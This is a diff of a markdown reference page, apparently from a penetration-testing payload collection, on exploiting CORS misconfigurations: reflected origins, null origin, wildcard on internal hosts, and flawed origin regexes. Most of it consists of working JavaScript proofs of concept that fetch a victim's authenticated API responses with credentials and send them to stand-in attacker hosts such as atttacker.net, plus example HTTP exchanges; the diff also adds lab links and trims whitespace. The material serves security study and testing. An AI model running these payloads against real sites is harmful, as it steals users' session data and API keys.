@@ -1,26 +1,9 @@
 +++
 title = "CORS Misconfigurations"
-date = "2022-10-16"
+date = "2023-03-28"
 description = "All about cors misconfigurations."
-local_toc = true
+include_toc = 'true'
 +++
-
-# CORS Misconfiguration
-
-> A site-wide CORS misconfiguration was in place for an API domain. This allowed an attacker to make cross origin requests on behalf of the user as the application did not whitelist the Origin header and had Access-Control-Allow-Credentials: true meaning we could make requests from our attacker’s site using the victim’s credentials. 
-
-## Tools
-
-* [Corsy - CORS Misconfiguration Scanner](https://github.com/s0md3v/Corsy/)
-* [PostMessage POC Builder - @honoki](https://tools.honoki.net/postmessage.html)
-
-## Prerequisites
-
-* BURP HEADER> `Origin: https://evil.com`
-* VICTIM HEADER> `Access-Control-Allow-Credential: true`
-* VICTIM HEADER> `Access-Control-Allow-Origin: https://evil.com` OR `Access-Control-Allow-Origin: null`
-
-## Exploitation
 
 Usually you want to target an API endpoint. Use the following payload to exploit a CORS misconfiguration on target `https://victim.example.com/endpoint`.
 
@@ -32,12 +15,10 @@ Usually you want to target an API endpoint. Use the following payload to exploit
 GET /endpoint HTTP/1.1
 Host: victim.example.com
 Origin: https://evil.com
-Cookie: sessionid=... 
-
+Cookie: sessionid=...
 HTTP/1.1 200 OK
 Access-Control-Allow-Origin: https://evil.com
-Access-Control-Allow-Credentials: true 
-
+Access-Control-Allow-Credentials: true
 {"[private API key]"}
 ```
 
@@ -46,18 +27,17 @@ Access-Control-Allow-Credentials: true
 This PoC requires that the respective JS script is hosted at `evil.com`
 
 ```js
-var req = new XMLHttpRequest(); 
-req.onload = reqListener; 
-req.open('get','https://victim.example.com/endpoint',true); 
+var req = new XMLHttpRequest();
+req.onload = reqListener;
+req.open('get','https://victim.example.com/endpoint',true);
 req.withCredentials = true;
 req.send();
-
 function reqListener() {
-    location='//atttacker.net/log?key='+this.responseText; 
+    location='//atttacker.net/log?key='+this.responseText;
 };
 ```
 
-or 
+or
 
 ```html
 <html>
@@ -96,12 +76,10 @@ response:
 GET /endpoint HTTP/1.1
 Host: victim.example.com
 Origin: null
-Cookie: sessionid=... 
-
+Cookie: sessionid=...
 HTTP/1.1 200 OK
 Access-Control-Allow-Origin: null
-Access-Control-Allow-Credentials: true 
-
+Access-Control-Allow-Credentials: true
 {"[private API key]"}
 ```
 
@@ -118,11 +96,10 @@ origin in the request:
   req.open('get','https://victim.example.com/endpoint',true);
   req.withCredentials = true;
   req.send();
-
   function reqListener() {
     location='https://attacker.example.net/log?key='+encodeURIComponent(this.responseText);
    };
-</script>"></iframe> 
+</script>"></iframe>
 ```
 
 ### Vulnerable Example: XSS on Trusted Origin
@@ -141,7 +118,7 @@ https://trusted-origin.example.com/?xss=<script>CORS-ATTACK-PAYLOAD</script>
 If the server responds with a wildcard origin `*`, **the browser does never send
 the cookies**. However, if the server does not require authentication, it's still
 possible to access the data on the server. This can happen on internal servers
-that are not accessible from the Internet. The attacker's website can then 
+that are not accessible from the Internet. The attacker's website can then
 pivot into the internal network and access the server's data without authentication.
 
 ```powershell
@@ -155,23 +132,20 @@ https://*.example.com is not valid
 GET /endpoint HTTP/1.1
 Host: api.internal.example.com
 Origin: https://evil.com
-
 HTTP/1.1 200 OK
 Access-Control-Allow-Origin: *
-
 {"[private API key]"}
 ```
 
 #### Proof of concept
 
 ```js
-var req = new XMLHttpRequest(); 
-req.onload = reqListener; 
-req.open('get','https://api.internal.example.com/endpoint',true); 
+var req = new XMLHttpRequest();
+req.onload = reqListener;
+req.open('get','https://api.internal.example.com/endpoint',true);
 req.send();
-
 function reqListener() {
-    location='//atttacker.net/log?key='+this.responseText; 
+    location='//atttacker.net/log?key='+this.responseText;
 };
 ```
 
@@ -180,19 +154,16 @@ Occasionally, certain expansions of the original origin are not filtered on the 
 
 #### Vulnerable Implementation (Example 1)
 
-In this scenario any prefix inserted in front of `example.com` will be accepted by the server. 
+In this scenario any prefix inserted in front of `example.com` will be accepted by the server.
 
 ```
 GET /endpoint HTTP/1.1
 Host: api.example.com
 Origin: https://evilexample.com
-
 HTTP/1.1 200 OK
 Access-Control-Allow-Origin: https://evilexample.com
-Access-Control-Allow-Credentials: true 
-
+Access-Control-Allow-Credentials: true
 {"[private API key]"}
-
 ```
 
 #### Proof of concept (Example 1)
@@ -200,14 +171,13 @@ Access-Control-Allow-Credentials: true
 This PoC requires the respective JS script to be hosted at `evilexample.com`
 
 ```js
-var req = new XMLHttpRequest(); 
-req.onload = reqListener; 
-req.open('get','https://api.example.com/endpoint',true); 
+var req = new XMLHttpRequest();
+req.onload = reqListener;
+req.open('get','https://api.example.com/endpoint',true);
 req.withCredentials = true;
 req.send();
-
 function reqListener() {
-    location='//atttacker.net/log?key='+this.responseText; 
+    location='//atttacker.net/log?key='+this.responseText;
 };
 ```
 
@@ -219,13 +189,10 @@ In this scenario the server utilizes a regex where the dot was not escaped corre
 GET /endpoint HTTP/1.1
 Host: api.example.com
 Origin: https://apiiexample.com
-
 HTTP/1.1 200 OK
 Access-Control-Allow-Origin: https://apiiexample.com
-Access-Control-Allow-Credentials: true 
-
+Access-Control-Allow-Credentials: true
 {"[private API key]"}
-
 ```
 
 #### Proof of concept (Example 2)
@@ -233,16 +200,22 @@ Access-Control-Allow-Credentials: true
 This PoC requires the respective JS script to be hosted at `apiiexample.com`
 
 ```js
-var req = new XMLHttpRequest(); 
-req.onload = reqListener; 
-req.open('get','https://api.example.com/endpoint',true); 
+var req = new XMLHttpRequest();
+req.onload = reqListener;
+req.open('get','https://api.example.com/endpoint',true);
 req.withCredentials = true;
 req.send();
-
 function reqListener() {
-    location='//atttacker.net/log?key='+this.responseText; 
+    location='//atttacker.net/log?key='+this.responseText;
 };
 ```
+
+## Labs
+
+* [CORS vulnerability with basic origin reflection](https://portswigger.net/web-security/cors/lab-basic-origin-reflection-attack)
+* [CORS vulnerability with trusted null origin](https://portswigger.net/web-security/cors/lab-null-origin-whitelisted-attack)
+* [CORS vulnerability with trusted insecure protocols](https://portswigger.net/web-security/cors/lab-breaking-https-attack)
+* [CORS vulnerability with internal network pivot attack](https://portswigger.net/web-security/cors/lab-internal-network-pivot-attack)
 
 ## Bug Bounty reports
 
@@ -260,4 +233,3 @@ function reqListener() {
 * [Advanced CORS Exploitation Techniques - Corben Leo - June 16, 2018](https://www.corben.io/advanced-cors-techniques/)
 * [PortSwigger Web Security Academy: CORS](https://portswigger.net/web-security/cors)
 * [CORS Misconfigurations Explained - Detectify Blog](https://blog.detectify.com/2018/04/26/cors-misconfigurations-explained/)
-* [trufflesecurity/of-cors - Exploit CORS misconfigurations on the internal networks](https://github.com/trufflesecurity/of-cors) 
